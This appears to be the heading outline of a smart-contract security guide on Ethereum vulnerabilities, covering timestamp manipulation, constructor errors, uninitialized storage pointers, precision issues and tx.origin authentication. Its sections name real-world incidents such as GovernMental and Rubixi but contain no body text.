## Real-World Examples: GovernMental

# Block Timestamp Manipulation

## The Vulnerability

## Preventative Techniques

## Real-World Example: GovernMental

# Constructors with Care

## The Vulnerability

## Preventative Techniques

## Real-World Example: Rubixi

# Uninitialized Storage Pointers

## The Vulnerability

## Preventative Techniques
## Real-World Examples: OpenAddressLottery and CryptoRoulette Honey Pots

# Floating Point and Precision
## The Vulnerability

## Preventative Techniques
## Real-World Example: Ethstick

# Tx.Origin Authentication
## The Vulnerability

## Preventative Techniques

# Contract Libraries
# Conclusion

